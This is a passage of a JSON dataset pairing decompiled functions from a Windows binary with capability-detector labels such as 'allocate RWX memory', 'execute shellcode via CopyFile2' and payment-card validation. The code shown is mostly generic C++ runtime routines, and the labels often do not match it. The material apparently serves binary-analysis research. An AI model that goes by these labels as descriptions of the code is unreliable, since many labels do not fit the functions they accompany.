        "decompiled_code": "\nuint64_t fcn.1400b7a50(ulong arg1, uchar *s)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    int64_t arg1_00;\n    int64_t *piVar3;\n    uint64_t uVar4;\n    uchar uStack49;\n    int64_t *apiStack48 [2];\n    \n    if (s == NULL) {\n        fcn.1400bd270(\"basic_string::_S_construct null not valid\");\n        return 0;\n    }\n    arg1_00 = sub.msvcrt.dll_strlen(s);\n    piVar3 = fcn.14007c090(arg1_00, 0);\n    apiStack48[0] = piVar3 + 3;\n    if (arg1_00 == 1) {\n        *(piVar3 + 3) = *s;\n    }\n    else if (arg1_00 != 0) {\n        apiStack48[0] = sub.msvcrt.dll_memcpy(apiStack48[0], s, arg1_00);\n    }\n    *(piVar3 + 2) = 0;\n    *piVar3 = arg1_00;\n    *(piVar3 + arg1_00 + 0x18) = 0;\n    fcn.1400b36e0(arg1, apiStack48);\n    if (**0x14010fc90 == 0) {\n        uVar2 = *(piVar3 + 2);\n        *(piVar3 + 2) = uVar2 - 1;\n    }\n    else {\n        LOCK();\n        piVar1 = piVar3 + 2;\n        uVar2 = *piVar1;\n        *piVar1 = *piVar1 - 1;\n    }\n    if (0 < uVar2) {\n        return uVar2;\n    }\n    uVar4 = fcn.14007bf10(piVar3, &uStack49);\n    return uVar4;\n}\n",
        "token_count": 432
    },
    "1400b7b6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint64_t * fcn.1400b7b60(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uchar *arg1_00;\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    int64_t *piVar7;\n    uint8_t *puVar8;\n    uint64_t uVar9;\n    int64_t *arg2_00;\n    ulong unaff_RDI;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong var_28h;\n    ulong var_bp_30h;\n    ulong var_38h;\n    ulong auStack168 [5];\n    char acStack121 [17];\n    int64_t *apiStack104 [3];\n    ulong auStack80 [5];\n    uchar auStack40 [8];\n    uchar *puStack32;\n    ulong var_8h;\n    \n    auStack80[0] = 0x1400b7b80;\n    uVar6 = arg1;\n    uStackX16 = arg2;\n    uStackX24 = arg3;\n    var_28h = arg4;\n    iVar4 = sub.msvcrt.dll_strlen();\n    iVar4 = iVar4 + 0x200;\n    auStack80[0] = 0x1400b7b96;\n    iVar5 = fcn.1400147b0(uVar6);\n    iVar5 = -iVar5;\n    puStack32 = &stack0x00000010;\n    *(&stack0xffffffffffffffb0 + iVar5) = 0x1400b7bb1;\n    fcn.140020d70(&stack0xffffffffffffffd8 + iVar5, iVar4, arg1, &stack0x00000010);\n    *(&stack0xffffffffffffffb0 + iVar5) = 0x1400b7bbb;\n    uVar6 = fcn.1400bc7f0(0x10);\n    *(&stack0xffffffffffffffb0 + iVar5) = 0x1400b7bc9;\n    fcn.140083040(uVar6, &stack0xffffffffffffffd8 + iVar5);\n    *(&stack0xffffffffffffffb0 + iVar5) = 0x1400b7bdf;\n    piVar7 = fcn.1400bcdb0(uVar6, 0x140112900, 0x1400831c0);\n    *(&stack0xffffffffffffffb0 + iVar5) = 0x1400b7bea;\n    fcn.1400bcb10(uVar6);\n    *(&stack0xffffffffffffffb0 + iVar5) = 0x1400b7bf2;\n    arg2_00 = piVar7;\n    fcn.140014f30(piVar7);\n    *(&stack0xffffffffffffffb0 + iVar5) = &stack0xffffffffffffffe8;\n    *(&stack0xffffffffffffffa8 + iVar5) = unaff_RDI;\n    *(&stack0xffffffffffffffa0 + iVar5) = piVar7;\n    *(&stack0xffffffffffffff98 + iVar5) = uVar6;\n    *(&stack0xffffffffffffff58 + iVar5) = 0x1400b7c1e;\n    fcn.140078330(&stack0xffffffffffffff87 + iVar5, arg2_00, 1);\n    if ((&stack0xffffffffffffff87)[iVar5] == '\\0') {\n        return arg2_00;\n    }\n    arg1_00 = &stack0xffffffffffffff88 + iVar5;\n    iVar4 = *(*arg2_00 + -0x18);\n    *(&stack0xffffffffffffff58 + iVar5) = 0x1400b7c56;\n    fcn.1400a59d0(arg1_00, arg2_00 + iVar4 + 0xd0);\n    *(&stack0xffffffffffffff58 + iVar5) = 0x1400b7c5e;\n    iVar4 = fcn.1400b97f0(arg1_00);\n    *(&stack0xffffffffffffff58 + iVar5) = 0x1400b7c69;\n    fcn.1400a5ae0(arg1_00);\n    piVar7 = *(arg2_00 + *(*arg2_00 + -0x18) + 0xe8);\n    puVar8 = piVar7[2];\n    if (puVar8 < piVar7[3]) goto code_r0x0001400b7c95;\ncode_r0x0001400b7cd0:\n    pcVar2 = *(*piVar7 + 0x48);\n    *(&stack0xffffffffffffff58 + iVar5) = 0x1400b7cd9;\n    uVar9 = (*pcVar2)(piVar7);\n    if (uVar9 == -1) {\ncode_r0x0001400b7cde:\n        iVar4 = *(*arg2_00 + -0x18) + arg2_00;\n        uVar1 = *(iVar4 + 0x20);\n        *(&stack0xffffffffffffff58 + iVar5) = 0x1400b7cf3;\n        fcn.1400b4ab0(iVar4, uVar1 | 2);\n        return arg2_00;\n    }\n    do {\n        if ((*(*(iVar4 + 0x30) + (uVar9 & 0xff) * 2) & 0x20) == 0) {\n            return arg2_00;\n        }\n        if (piVar7[2] < piVar7[3]) {\n            puVar8 = piVar7[2] + 1;\n            piVar7[2] = puVar8;\n            if (piVar7[3] <= puVar8) goto code_r0x0001400b7cd0;\n        }\n        else {\n            pcVar2 = *(*piVar7 + 0x50);\n            *(&stack0xffffffffffffff58 + iVar5) = 0x1400b7cbb;\n            iVar3 = (*pcVar2)(piVar7);\n            if (iVar3 == -1) goto code_r0x0001400b7cde;\n            puVar8 = piVar7[2];\n            if (piVar7[3] <= puVar8) goto code_r0x0001400b7cd0;\n        }\ncode_r0x0001400b7c95:\n        uVar9 = *puVar8;\n    } while( true );\n}\n",
        "token_count": 1472
    },
    "1400bc4e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400bc4e0(int64_t *arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    \n    iVar2 = *arg1;\n    *(iVar2 + 0x60) = 0;\n    *(iVar2 + 0x98) = 0;\n    if (*(iVar2 + 0x80) != '\\0') {\n        if (*(iVar2 + 0x70) != 0) {\n            fcn.1400bc6b0();\n        }\n        *(iVar2 + 0x70) = 0;\n        *(iVar2 + 0x80) = 0;\n    }\n    if (*(iVar2 + 0xa8) != 0) {\n        fcn.1400bc6b0();\n    }\n    iVar3 = *arg1;\n    *(iVar2 + 0xa8) = 0;\n    *(iVar2 + 0xb8) = 0x0;\n    uVar4 = *(iVar3 + 0x70);\n    uVar1 = *(iVar3 + 100);\n    *(iVar2 + 0xb0) = 0;\n    *(iVar3 + 0x20) = 0x0;\n    *(iVar3 + 0x18) = uVar4;\n    *(iVar3 + 0x30) = 0;\n    *(iVar3 + 0x81) = 0;\n    *(iVar3 + 8) = uVar4;\n    *(iVar3 + 0x10) = uVar4;\n    *(iVar3 + 0x68) = CONCAT44(uVar1, uVar1);\n    return;\n}\n",
        "token_count": 376
    },
    "1400bc5a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400bc5a0(int64_t *arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    \n    iVar2 = *arg1;\n    *(iVar2 + 0x60) = 0;\n    *(iVar2 + 0x98) = 0;\n    if (*(iVar2 + 0x80) != '\\0') {\n        if (*(iVar2 + 0x70) != 0) {\n            fcn.1400bc6b0();\n        }\n        *(iVar2 + 0x70) = 0;\n        *(iVar2 + 0x80) = 0;\n    }\n    if (*(iVar2 + 0xa8) != 0) {\n        fcn.1400bc6b0();\n    }\n    iVar3 = *arg1;\n    *(iVar2 + 0xa8) = 0;\n    *(iVar2 + 0xb8) = 0x0;\n    uVar4 = *(iVar3 + 0x70);\n    uVar1 = *(iVar3 + 100);\n    *(iVar2 + 0xb0) = 0;\n    *(iVar3 + 0x20) = 0x0;\n    *(iVar3 + 0x18) = uVar4;\n    *(iVar3 + 0x30) = 0;\n    *(iVar3 + 0x81) = 0;\n    *(iVar3 + 8) = uVar4;\n    *(iVar3 + 0x10) = uVar4;\n    *(iVar3 + 0x68) = CONCAT44(uVar1, uVar1);\n    return;\n}\n",
        "token_count": 376
    },
    "1400bc86": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.1400bc860(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    ulong arg2;\n    ulong uVar2;\n    char cVar3;\n    int64_t **ppiVar4;\n    ulong arg1_00;\n    int64_t *piVar5;\n    int64_t arg1_01;\n    ulong *puVar6;\n    uchar auStack168 [16];\n    ulong uStack152;\n    int64_t *piStack120;\n    \n    ppiVar4 = fcn.1400bcb60();\n    piVar5 = arg1 + -10;\n    piStack120 = *ppiVar4;\n    if (*arg1 + 0xb8b1aabcbcd4d500U < 2) {\n        iVar1 = *(arg1 + -5);\n        if (iVar1 < 0) {\n            iVar1 = -iVar1;\n        }\n        *(arg1 + -5) = iVar1 + 1;\n        *(ppiVar4 + 1) = *(ppiVar4 + 1) + -1;\n        if (piStack120 != piVar5) {\n            arg1[-6] = piStack120;\n            *ppiVar4 = piVar5;\n        }\n        return arg1[-1];\n    }\n    if (piStack120 == NULL) {\n        *ppiVar4 = piVar5;\n        return 0;\n    }\n    fcn.1400b8f90();\n    if (piStack120 != NULL) {\n        fcn.1400bc860(piStack120);\n        if (*piStack120 + 0xb8b1aabcbcd4d500U < 2) goto code_r0x0001400bc90a;\n    }\n    fcn.1400b8f90();\ncode_r0x0001400bc90a:\n    arg1_01 = piStack120[-7];\n    fcn.14001f750();\n    fcn.1400bc860(arg1_01);\n    uStack152 = *(arg1_01 + -0x10);\n    arg2 = *(arg1_01 + -0x18);\n    iVar1 = *(arg1_01 + -0x24);\n    uVar2 = *(arg1_01 + -0x38);\n    arg1_00 = fcn.14001f770(*(arg1_01 + -0x40));\n    fcn.1400bc860(arg1_00);\n    piVar5 = fcn.1400bcb70();\n    puVar6 = *piVar5;\n    if ((*(puVar6 + 10) & 1) == 0) goto code_r0x0001400bc9da;\n    puVar6 = *puVar6;\n    while( true ) {\n        fcn.14001f340(0, arg2, auStack168);\n        cVar3 = fcn.14001f430(auStack168, puVar6[-0x12], puVar6, iVar1);\n        if (cVar3 != '\\0') break;\n        puVar6 = 0x140112960;\n        cVar3 = fcn.14001f430(auStack168, 0x140112960, 0, iVar1);\n        if (cVar3 == '\\0') goto code_r0x0001400bc9fd;\n        piVar5 = fcn.1400bc7f0(8);\n        *piVar5 = *0x1401104c0 + 0x10;\n        fcn.1400bcdb0(piVar5, 0x140112960, 0x1400892d0);\ncode_r0x0001400bc9da:\n        puVar6 = puVar6 + 0x12;\n    }\n    fcn.1400bcd60();\ncode_r0x0001400bc9fd:\n    fcn.14001f750(uVar2);\n    ppiVar4 = fcn.1400bcb60();\n    piVar5 = *ppiVar4;\n    if (piVar5 != NULL) {\n        if ((*(piVar5 + 10) & 1) != 0) {\n            piVar5 = *piVar5 + -0x90;\n        }\n        piVar5 = *piVar5;\n    }\n    return piVar5;\n}\n",
        "token_count": 946
    },
    "1400bc8e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400bc8e0(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    ulong arg2;\n    ulong uVar2;\n    char cVar3;\n    ulong arg1_00;\n    int64_t *piVar4;\n    int64_t **ppiVar5;\n    int64_t arg1_01;\n    ulong *puVar6;\n    uchar auStack128 [16];\n    ulong uStack112;\n    int64_t *piStack80;\n    \n    if (arg1 != NULL) {\n        fcn.1400bc860(arg1);\n        if (*arg1 + 0xb8b1aabcbcd4d500U < 2) goto code_r0x0001400bc90a;\n    }\n    fcn.1400b8f90();\ncode_r0x0001400bc90a:\n    arg1_01 = arg1[-7];\n    fcn.14001f750();\n    piStack80 = arg1;\n    fcn.1400bc860(arg1_01);\n    uStack112 = *(arg1_01 + -0x10);\n    arg2 = *(arg1_01 + -0x18);\n    iVar1 = *(arg1_01 + -0x24);\n    uVar2 = *(arg1_01 + -0x38);\n    arg1_00 = fcn.14001f770(*(arg1_01 + -0x40));\n    fcn.1400bc860(arg1_00);\n    piVar4 = fcn.1400bcb70();\n    puVar6 = *piVar4;\n    if ((*(puVar6 + 10) & 1) == 0) goto code_r0x0001400bc9da;\n    puVar6 = *puVar6;\n    while( true ) {\n        fcn.14001f340(0, arg2, auStack128);\n        cVar3 = fcn.14001f430(auStack128, puVar6[-0x12], puVar6, iVar1);\n        if (cVar3 != '\\0') break;\n        puVar6 = 0x140112960;\n        cVar3 = fcn.14001f430(auStack128, 0x140112960, 0, iVar1);\n        if (cVar3 == '\\0') goto code_r0x0001400bc9fd;\n        piVar4 = fcn.1400bc7f0(8);\n        *piVar4 = *0x1401104c0 + 0x10;\n        fcn.1400bcdb0(piVar4, 0x140112960, 0x1400892d0);\ncode_r0x0001400bc9da:\n        puVar6 = puVar6 + 0x12;\n    }\n    fcn.1400bcd60();\ncode_r0x0001400bc9fd:\n    fcn.14001f750(uVar2);\n    ppiVar5 = fcn.1400bcb60();\n    piVar4 = *ppiVar5;\n    if (piVar4 != NULL) {\n        if ((*(piVar4 + 10) & 1) != 0) {\n            piVar4 = *piVar4 + -0x90;\n        }\n        piVar4 = *piVar4;\n    }\n    return piVar4;\n}\n",
        "token_count": 743
    },
    "1400bca4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400bca40(void)\n\n{\n    uint64_t *puVar1;\n    uint64_t arg1;\n    int32_t iVar2;\n    \n    puVar1 = fcn.1400bcb70();\n    arg1 = *puVar1;\n    if (arg1 != 0) {\n        if (1 < *(arg1 + 0x50) + 0xb8b1aabcbcd4d500U) {\n            *puVar1 = 0;\ncode_r0x000140015030:\n            if (*(arg1 + 0x58) != NULL) {\n    // WARNING: Could not recover jumptable at 0x000140015041. Too many branches\n    // WARNING: Treating indirect jump as call\n                (**(arg1 + 0x58))(1, arg1 + 0x50);\n                return;\n            }\n            return;\n        }\n        iVar2 = *(arg1 + 0x28);\n        if (iVar2 < 0) {\n            iVar2 = iVar2 + 1;\n            if (iVar2 == 0) {\n                *puVar1 = *(arg1 + 0x20);\n            }\n        }\n        else {\n            iVar2 = iVar2 + -1;\n            if (iVar2 == 0) {\n                *puVar1 = *(arg1 + 0x20);\n                goto code_r0x000140015030;\n            }\n            if (iVar2 == -1) {\n                fcn.1400b8f90();\n                if ((*0x140106bb8 < arg1) && (arg1 < *0x140106bb8 + *0x140106bc0)) {\n                    fcn.14001fff0(arg1);\n                    return;\n                }\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n                (*_sym.imp.msvcrt.dll_free)();\n                return;\n            }\n        }\n        *(arg1 + 0x28) = iVar2;\n    }\n    return;\n}\n",
        "token_count": 456
    },
    "1400bcbc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.1400bcbc0(char *arg1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    ulong *arg1_00;\n    uchar *arg1_01;\n    ulong uVar4;\n    int64_t iVar5;\n    uint64_t in_RDX;\n    ulong in_R8;\n    \n    puVar1 = *0x14010fc90;\n    if (*arg1 == '\\0') {\n        uVar3 = **0x14010fc90;\n        if (**0x14010fc90 == 0) {\n            if (*arg1 == '\\0') {\n                if (arg1[1] != '\\0') {\ncode_r0x0001400bcc8c:\n                    arg1_01 = fcn.1400bd890();\n                    if (*puVar1 != 0) {\n                        iVar2 = fcn.140014b10(*0x140107c20);\n                        if (iVar2 != 0) {\n                            fcn.140021df0();\n                        }\n                    }\n                    fcn.140014f30(arg1_01);\n                    arg1_01[1] = 0;\n                    *arg1_01 = 1;\n                    uVar3 = **0x14010fc90;\n                    if (**0x14010fc90 != 0) {\n                        iVar5 = *0x140107c20;\n                        uVar3 = fcn.140014b10(*0x140107c20);\n                        if (uVar3 != 0) {\n                            fcn.140021df0();\n                            *(iVar5 + -0xa0) = 0;\n                            *(iVar5 + -0x90) = in_RDX;\n                            *(iVar5 + -0x88) = in_R8;\n                            uVar4 = fcn.1400b6680();\n                            *(iVar5 + -0x80) = uVar4;\n                            uVar4 = fcn.1400b60b0();\n                            *(iVar5 + -0x78) = uVar4;\n                            *(iVar5 + -0x40) = 0x474e5543432b2b00;\n                            *(iVar5 + -0x38) = 0x14001f5b0;\n                            return iVar5 - 0xa0;\n                        }\n                    }\n                    return uVar3;\n                }\ncode_r0x0001400bcbf0:\n                arg1[1] = '\\x01';\n                uVar3 = 1;\n            }\n            return uVar3;\n        }\n        fcn.1400147f0(0x140109370, 0x140020330);\n        in_RDX = *puVar1;\n        iVar5 = *0x140107c20;\n        if (*puVar1 != 0) goto code_r0x0001400bcc30;\n        if (*arg1 == '\\0') {\n            do {\n                if (arg1[1] == '\\0') goto code_r0x0001400bcbf0;\n                fcn.1400bd890();\ncode_r0x0001400bcc30:\n                iVar2 = fcn.140014a50(iVar5);\n                if (iVar2 != 0) {\n                    arg1_00 = fcn.1400bc7f0(8);\n                    in_R8 = 0x140021a20;\n                    in_RDX = 0x1401118e0;\n                    *arg1_00 = 0x140116310;\n                    fcn.1400bcdb0(arg1_00, 0x1401118e0, 0x140021a20);\n                    goto code_r0x0001400bcc87;\n                }\n            } while (*arg1 == '\\0');\n            if (*puVar1 != 0) {\n                iVar2 = fcn.140014b10(*0x140107c20);\n                if (iVar2 != 0) {\ncode_r0x0001400bcc87:\n                    fcn.140021df0();\n                    goto code_r0x0001400bcc8c;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 910
    },
    "1400bcd6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400bcd60(void)\n\n{\n    int64_t *piVar1;\n    int64_t arg1;\n    \n    piVar1 = fcn.1400bcb60();\n    arg1 = *piVar1;\n    *(piVar1 + 1) = *(piVar1 + 1) + 1;\n    if (arg1 == 0) goto code_r0x0001400bcda3;\n    if (*(arg1 + 0x50) + 0xb8b1aabcbcd4d500U < 2) goto code_r0x0001400bcda8;\n    *piVar1 = 0;\n    do {\n        arg1 = arg1 + 0x50;\n        fcn.140014fe0(arg1);\n        fcn.1400bc860(arg1);\ncode_r0x0001400bcda3:\n        fcn.1400b8f90();\ncode_r0x0001400bcda8:\n        *(arg1 + 0x28) = -*(arg1 + 0x28);\n    } while( true );\n}\n",
        "token_count": 243
    },
    "1400bd40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400bd400(ulong arg1)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    \n    uVar1 = fcn.1400bc7f0(0x10);\n    fcn.140095db0(uVar1, arg1);\n    uVar2 = fcn.1400bcdb0(uVar1, 0x140112a70, fcn.140095f80);\n    fcn.1400bcb10(uVar1);\n    fcn.140014f30(uVar2);\n    uVar1 = fcn.1400bc7f0(0x10);\n    fcn.140080f00(uVar1, uVar2);\n    uVar2 = fcn.1400bcdb0(uVar1, 0x140112850, 0x140081080);\n    fcn.1400bcb10(uVar1);\n    fcn.140014f30(uVar2);\n    uVar1 = fcn.1400bc7f0(0x10);\n    fcn.14009b0e0(uVar1, uVar2);\n    uVar2 = fcn.1400bcdb0(uVar1, 0x140112bd0, 0x14009b260);\n    fcn.1400bcb10(uVar1);\n    fcn.140014f30(uVar2);\n    uVar1 = fcn.1400bc7f0(0x10);\n    fcn.14009d640(uVar1, uVar2);\n    uVar2 = fcn.1400bcdb0(uVar1, 0x140112d10, 0x14009d7c0);\n    fcn.1400bcb10(uVar1);\n    fcn.140014f30(uVar2);\n    if (*0x1401067a0 == '\\0') {\n        *0x1401067a0 = '\\x01';\n    }\n    if (*0x1401067c0 == '\\0') {\n        *0x1401067c0 = '\\x01';\n    }\n    if (*0x140106860 == '\\0') {\n        *0x140106860 = '\\x01';\n    }\n    if (*0x140106880 == '\\0') {\n        *0x140106880 = '\\x01';\n    }\n    if (*0x140106620 == '\\0') {\n        *0x140106620 = '\\x01';\n    }\n    if (*0x140106630 == '\\0') {\n        *0x140106630 = '\\x01';\n    }\n    if (*0x140106800 == '\\0') {\n        *0x140106800 = '\\x01';\n    }\n    if (*0x140106660 == '\\0') {\n        *0x140106660 = '\\x01';\n    }\n    if (*0x140106840 == '\\0') {\n        *0x140106840 = '\\x01';\n    }\n    if (*0x140106820 == '\\0') {\n        *0x140106820 = '\\x01';\n    }\n    if (*0x1401067e0 == '\\0') {\n        *0x1401067e0 = '\\x01';\n    }\n    if (*0x140106780 == '\\0') {\n        *0x140106780 = '\\x01';\n    }\n    return;\n}\n",
        "token_count": 741
    },
    "1400120a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.1400120a0(int64_t arg1, ulong noname_1, int64_t *arg3, ulong arg4)\n\n{\n    uchar uVar1;\n    char cVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    ulong uVar5;\n    ulong arg3_00;\n    int64_t iVar6;\n    int64_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uchar *puVar10;\n    int32_t *piVar11;\n    uchar *puVar12;\n    uchar auStack88 [40];\n    \n    iVar8 = arg4;\n    if (arg3 != NULL) {\n        do {\n            if (*(arg1 + 0x130) != 0) {\n                return;\n            }\n            if (*(arg3 + 2) == 0) {\n                piVar11 = arg3[1];\n                iVar3 = *piVar11;\n                if (iVar8 == 0) {\n                    if (iVar3 - 0x1cU < 0x36) {\n                        if ((0x3400000000001fU >> (iVar3 - 0x1cU & 0x3f) & 1) != 0) goto code_r0x00014001211a;\n                        goto code_r0x0001400120d6;\n                    }\n                    *(arg3 + 2) = 1;\n                    uVar4 = *(arg1 + 0x120);\n                    *(arg1 + 0x120) = arg3[3];\n                }\n                else {\ncode_r0x0001400120d6:\n                    *(arg3 + 2) = 1;\n                    uVar4 = *(arg1 + 0x120);\n                    *(arg1 + 0x120) = arg3[3];\n                    if (iVar3 == 0x29) {\n                        fcn.140011d80(arg1, 0x11, piVar11, *arg3);\n                        *(arg1 + 0x120) = uVar4;\n                        return;\n                    }\n                    if (iVar3 == 0x2a) {\n                        fcn.140012420(arg1, 0x11, piVar11, *arg3);\n                        *(arg1 + 0x120) = uVar4;\n                        return;\n                    }\n                }\n                if (iVar3 == 2) {\n                    uVar5 = *(arg1 + 0x128);\n                    arg3_00 = *(piVar11 + 4);\n                    *(arg1 + 0x128) = 0;\n                    fcn.1400113f0(arg1, 0x11, arg3_00);\n                    *(arg1 + 0x128) = uVar5;\n                    puVar10 = 0x14010c6a5;\n                    iVar7 = *(arg1 + 0x100);\n                    do {\n                        uVar1 = *puVar10;\n                        if (iVar7 == 0xff) {\n                            *(arg1 + 0xff) = 0;\n                            (**(arg1 + 0x110))(arg1);\n                            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                            iVar6 = 1;\n                            iVar7 = 0;\n                        }\n                        else {\n                            iVar6 = iVar7 + 1;\n                        }\n                        puVar10 = puVar10 + 1;\n                        *(arg1 + 0x100) = iVar6;\n                        *(arg1 + iVar7) = uVar1;\n                        *(arg1 + 0x108) = uVar1;\n                        iVar7 = iVar6;\n                    } while (puVar10 != 0x14010c6a7);\n                    piVar11 = *(arg3[1] + 0x18);\n                    iVar8 = *piVar11;\n                    if (iVar8 == 0x48) {\n                        pcVar9 = \"{default arg#\";\n                        do {\n                            cVar2 = *pcVar9;\n                            if (iVar6 == 0xff) {\n                                *(arg1 + 0xff) = 0;\n                                (**(arg1 + 0x110))(arg1);\n                                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                                iVar7 = 1;\n                                iVar6 = 0;\n                            }\n                            else {\n                                iVar7 = iVar6 + 1;\n                            }\n                            pcVar9 = pcVar9 + 1;\n                            *(arg1 + 0x100) = iVar7;\n                            *(arg1 + iVar6) = cVar2;\n                            *(arg1 + 0x108) = cVar2;\n                            iVar6 = iVar7;\n                        } while (pcVar9 != \"\");\n                        puVar10 = auStack88;\n                        fcn.14000abc0(puVar10, 0x14010c2ac, piVar11[6] + 1, arg4);\n                        iVar6 = sub.msvcrt.dll_strlen(puVar10);\n                        iVar7 = *(arg1 + 0x100);\n                        if (iVar6 != 0) {\n                            puVar12 = puVar10 + iVar6;\n                            iVar6 = iVar7;\n                            do {\n                                uVar1 = *puVar10;\n                                if (iVar6 == 0xff) {\n                                    *(arg1 + 0xff) = 0;\n                                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                                    iVar7 = 1;\n                                    iVar6 = 0;\n                                }\n                                else {\n                                    iVar7 = iVar6 + 1;\n                                }\n                                puVar10 = puVar10 + 1;\n                                *(arg1 + 0x100) = iVar7;\n                                *(arg1 + iVar6) = uVar1;\n                                *(arg1 + 0x108) = uVar1;\n                                iVar6 = iVar7;\n                            } while (puVar10 != puVar12);\n                        }\n                        puVar10 = 0x14010c6b6;\n                        do {\n                            uVar1 = *puVar10;\n                            if (iVar7 == 0xff) {\n                                *(arg1 + 0xff) = 0;\n                                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                                iVar6 = 1;\n                                iVar7 = 0;\n                            }\n                            else {\n                                iVar6 = iVar7 + 1;\n                            }\n                            puVar10 = puVar10 + 1;\n                            *(arg1 + 0x100) = iVar6;\n                            *(arg1 + iVar7) = uVar1;\n                            *(arg1 + 0x108) = uVar1;\n                            iVar7 = iVar6;\n                        } while (puVar10 != 0x14010c6b9);\n                        piVar11 = *(piVar11 + 4);\n                        iVar8 = *piVar11;\n                    }\n                    while ((iVar8 - 0x1cU < 0x36 && ((0x3400000000001fU >> (iVar8 - 0x1cU & 0x3f) & 1) != 0))) {\n                        piVar11 = *(piVar11 + 4);\n                        iVar8 = *piVar11;\n                    }\n                    fcn.1400113f0(arg1, 0x11, piVar11);\n                    *(arg1 + 0x120) = uVar4;\n                    return;\n                }\n                fcn.140011490(arg1, 0x11, piVar11);\n                *(arg1 + 0x120) = uVar4;\n            }\ncode_r0x00014001211a:\n            arg3 = *arg3;\n        } while (arg3 != NULL);\n    }\n    return;\n}\n",
        "token_count": 1759
    },
    "140013a8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "allocate RW memory"
        ],
